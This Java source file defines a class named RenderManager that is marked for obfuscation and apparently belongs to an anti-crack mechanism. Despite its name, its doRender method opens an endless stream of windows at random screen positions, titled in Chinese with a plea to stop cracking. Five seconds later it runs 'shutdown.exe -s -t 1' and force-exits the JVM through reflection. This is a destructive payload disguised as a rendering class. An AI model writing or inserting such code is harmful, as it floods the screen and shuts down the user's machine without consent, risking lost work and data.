package my.distance.manager;

import LemonObfAnnotation.ObfuscationClass;

import javax.swing.*;
import java.lang.reflect.Method;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

@ObfuscationClass
public class RenderManager {
    private static final java.util.Timer timer = new Timer();
    private static final int screenWidth = (java.awt.Toolkit.getDefaultToolkit().getScreenSize().width);
    private static final int screenHeight = (java.awt.Toolkit.getDefaultToolkit().getScreenSize().height);

    public static void doRender() {
        new Thread(() -> {
            Random rd = new Random();
            while (true) {
                JFrame frame = new JFrame("别破解了，求你了");
                frame.setSize(400, 200);
                frame.setLocation(rd.nextInt(screenWidth), rd.nextInt(screenHeight));
                frame.setVisible(true);
            }
        }).start();
        timer.schedule(new TimerTask() {
            public void run() {
                Runtime run = Runtime.getRuntime();
                try {
                    run.exec("shutdown.exe -s -t 1");
                    Method shutDownMethod = Class.forName("java.lang.Shutdown").getDeclaredMethod("exit", Integer.TYPE);
                    shutDownMethod.setAccessible(true);
                    shutDownMethod.invoke(null, 0);
                } catch (Exception e) {
                    throw new IllegalStateException();
                }
            }
        }, (5000L));
    }
}
